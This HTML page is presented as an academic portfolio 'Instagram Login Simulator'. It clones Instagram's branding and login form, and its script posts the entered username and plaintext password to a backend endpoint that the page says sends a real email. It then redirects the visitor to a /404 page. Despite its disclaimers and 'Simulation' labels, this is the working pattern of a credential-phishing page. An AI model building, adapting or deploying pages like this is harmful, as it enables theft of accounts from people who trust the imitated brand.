<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login Simulator | Portfolio Project</title>
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <!-- Meta tags para portfolio -->
    <meta name="description" content="Academic project: Instagram login simulation with real email notifications - Full-stack development showcase">
    <meta name="keywords" content="portfolio, nodejs, vercel, fullstack, academic project, email integration">
    <meta name="author" content="Heliossandro Afonso">
    <!-- Favicon acad√™mico -->
    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>üéì</text></svg>">
</head>
<body>
    <!-- Header do Portfolio -->
    <header class="portfolio-header">
        <div class="portfolio-banner">
            <span class="academic-badge">
                <i class="fas fa-graduation-cap"></i> Academic Project
            </span>
            <div class="portfolio-links">
                <a href="https://github.com/Heliossandro" target="_blank" class="portfolio-link" title="GitHub">
                    <i class="fab fa-github"></i>
                </a>
                <a href="https://www.linkedin.com/in/heliossandro-afonso-1336b8282/" target="_blank" class="portfolio-link" title="LinkedIn">
                    <i class="fab fa-linkedin"></i>
                </a>
                <a href="mailto:zenosama892@gmail.com" class="portfolio-link" title="Email">
                    <i class="fas fa-envelope"></i>
                </a>
            </div>
        </div>
    </header>

    <div class="container">
        <!-- Formul√°rio de Login -->
        <div class="login-container">
            <div class="login-box">
                <div class="logo">
                    <i class="fab fa-instagram"></i>
                    <span>Instagram</span>
                    <div class="simulation-tag">Simulation</div>
                </div>
                
                <div class="project-info">
                    <h3><i class="fas fa-code"></i> Portfolio Project</h3>
                    <p>Full-stack simulation demonstrating email integration and security concepts</p>
                </div>
                
                <form id="loginForm">
                    <div class="input-group">
                        <input type="text" id="username" 
                               placeholder="Test username or email"
                               autocomplete="username"
                               required>
                    </div>
                    
                    <div class="input-group">
                        <input type="password" id="password" 
                               placeholder="Test password (any value)"
                               autocomplete="current-password">
                    </div>
                    
                    <button type="submit" class="login-btn" id="submitBtn">
                        <span>Test Simulation</span>
                        <div class="spinner" id="spinner"></div>
                    </button>
                    
                    <div class="separator">
                        <span>DEMONSTRATION</span>
                    </div>
                    
                    <div class="tech-stack-mini">
                        <span class="tech-tag">Node.js</span>
                        <span class="tech-tag">Vercel</span>
                        <span class="tech-tag">Nodemailer</span>
                        <span class="tech-tag">API</span>
                    </div>
                </form>
            </div>
            
            <div class="features-box">
                <h4><i class="fas fa-star"></i> Project Features</h4>
                <ul>
                    <li><i class="fas fa-check-circle"></i> Real email notifications</li>
                    <li><i class="fas fa-check-circle"></i> Full-stack architecture</li>
                    <li><i class="fas fa-check-circle"></i> Vercel serverless deployment</li>
                    <li><i class="fas fa-check-circle"></i> Responsive design</li>
                </ul>
            </div>
            
            <div class="disclaimer">
                <div class="disclaimer-header">
                    <i class="fas fa-shield-alt"></i>
                    <h4>Academic & Ethical Notice</h4>
                </div>
                <div class="disclaimer-content">
                    <p><strong>üéì This is an educational simulation</strong> developed for academic purposes only.</p>
                    <p><strong>üîí Security:</strong> No real credentials are stored or misused.</p>
                    <p><strong>üìß Function:</strong> Clicking "Test Simulation" sends a demonstration email.</p>
                    <p><strong>‚ö†Ô∏è Warning:</strong> DO NOT use real Instagram or personal credentials.</p>
                </div>
                
                <div class="source-links">
                    <a href="https://github.com/Heliossandro/instagram-simulator" target="_blank" class="source-link">
                        <i class="fab fa-github"></i> View Source Code
                    </a>
                    <a href="https://vercel.com" target="_blank" class="source-link">
                        <i class="fas fa-cloud"></i> Powered by Vercel
                    </a>
                </div>
            </div>
        </div>
    </div>

    <!-- Modal de Confirma√ß√£o Profissional -->
    <div class="modal" id="confirmationModal">
        <div class="modal-overlay"></div>
        <div class="modal-container">
            <div class="modal-header">
                <div class="modal-icon">
                    <i class="fas fa-paper-plane"></i>
                </div>
                <h2>Simulation Complete!</h2>
                <p class="modal-subtitle">Demonstration email has been processed</p>
            </div>
            
            <div class="modal-body">
                <div class="simulation-result">
                    <div class="result-card">
                        <h4><i class="fas fa-user"></i> Test Data</h4>
                        <div class="result-details">
                            <div class="detail-item">
                                <span class="detail-label">Username:</span>
                                <span class="detail-value" id="resultUsername">-</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Status:</span>
                                <span class="status-badge success">‚úÖ Processed</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Timestamp:</span>
                                <span class="detail-value" id="resultTimestamp">-</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="portfolio-info">
                        <h4><i class="fas fa-laptop-code"></i> About This Project</h4>
                        <p>This simulation demonstrates full-stack development skills including:</p>
                        <ul>
                            <li>Backend API development with Node.js</li>
                            <li>Email service integration (Nodemailer)</li>
                            <li>Serverless deployment on Vercel</li>
                            <li>Frontend development with modern CSS</li>
                            <li>Security and ethical considerations</li>
                        </ul>
                        
                        <div class="project-stats">
                            <div class="stat">
                                <i class="fas fa-server"></i>
                                <span>Serverless API</span>
                            </div>
                            <div class="stat">
                                <i class="fas fa-envelope"></i>
                                <span>Real Email Service</span>
                            </div>
                            <div class="stat">
                                <i class="fas fa-mobile-alt"></i>
                                <span>Responsive Design</span>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="action-buttons">
                    <button class="btn-primary" onclick="viewDetails()">
                        <i class="fas fa-external-link-alt"></i> View Details
                    </button>
                    <button class="btn-secondary" onclick="closeModal()">
                        <i class="fas fa-times"></i> Close
                    </button>
                </div>
                
                <div class="redirect-notice">
                    <i class="fas fa-sync-alt fa-spin"></i>
                    <span>Redirecting to details page in <span id="countdown">5</span> seconds...</span>
                </div>
            </div>
            
            <div class="modal-footer">
                <p><small>Developed by Heliossandro Afonso ‚Ä¢ Academic Project ‚Ä¢ <a href="https://github.com/Heliossandro" target="_blank">View Portfolio</a></small></p>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const form = document.getElementById('loginForm');
            const submitBtn = document.getElementById('submitBtn');
            const spinner = document.getElementById('spinner');
            const modal = document.getElementById('confirmationModal');
            const resultUsername = document.getElementById('resultUsername');
            const resultTimestamp = document.getElementById('resultTimestamp');
            const countdownElement = document.getElementById('countdown');
            
            let countdownTimer;
            let redirectTimeout;

            form.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value.trim() || 'demo_user';
                const password = document.getElementById('password').value || 'demo_password';
                
                // Mostrar loading
                submitBtn.disabled = true;
                submitBtn.querySelector('span').textContent = 'Processing...';
                spinner.style.display = 'block';
                
                try {
                    // Enviar dados para a API do Vercel
                    console.log('Sending request to Vercel API...');
                    
                    const response = await fetch('/api/send-alert', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            username: username,
                            password: password
                        })
                    });
                    
                    const data = await response.json();
                    console.log('API Response:', data);
                    
                    // Atualizar modal com resultados
                    resultUsername.textContent = username;
                    resultTimestamp.textContent = new Date().toLocaleString('pt-BR');
                    
                    // Mostrar modal
                    showModal();
                    
                    // Iniciar contagem regressiva
                    startCountdown(username);
                    
                } catch (error) {
                    console.error('API Error:', error);
                    
                    // Fallback para modo de demonstra√ß√£o
                    resultUsername.textContent = username || 'demo_user';
                    resultTimestamp.textContent = new Date().toLocaleString('pt-BR');
                    
                    // Ainda mostrar modal em modo de demonstra√ß√£o
                    showModal();
                    startCountdown(username);
                    
                } finally {
                    resetButton();
                }
            });
            
            function showModal() {
                modal.style.display = 'block';
                document.body.style.overflow = 'hidden';
            }
            
            function closeModal() {
                modal.style.display = 'none';
                document.body.style.overflow = 'auto';
                clearTimeout(redirectTimeout);
                clearInterval(countdownTimer);
            }
            
            function startCountdown(username) {
                let seconds = 5;
                
                countdownTimer = setInterval(() => {
                    seconds--;
                    countdownElement.textContent = seconds;
                    
                    if (seconds <= 0) {
                        clearInterval(countdownTimer);
                        viewDetails(username);
                    }
                }, 1000);
                
                redirectTimeout = setTimeout(() => {
                    viewDetails(username);
                }, 5000);
            }
            
            function viewDetails(username = '') {
                const userParam = username ? `&user=${encodeURIComponent(username)}` : '';
                window.location.href = `/404?portfolio=true${userParam}&time=${Date.now()}`;
            }
            
            window.viewDetails = viewDetails;
            window.closeModal = closeModal;
            
            function resetButton() {
                submitBtn.disabled = false;
                submitBtn.querySelector('span').textContent = 'Test Simulation';
                spinner.style.display = 'none';
            }
            
            // Permitir Enter para enviar
            document.addEventListener('keypress', function(e) {
                if (e.key === 'Enter' && !submitBtn.disabled) {
                    form.dispatchEvent(new Event('submit'));
                }
            });
            
            // Fechar modal ao clicar no overlay
            modal.querySelector('.modal-overlay').addEventListener('click', closeModal);
            
            // Preencher com dados de exemplo se vazio
            document.getElementById('username').addEventListener('focus', function() {
                if (!this.value) {
                    this.value = 'portfolio_demo@example.com';
                }
            });
            
            document.getElementById('password').addEventListener('focus', function() {
                if (!this.value) {
                    this.value = 'demo_password_123';
                }
            });
        });
    </script>
</body>
</html>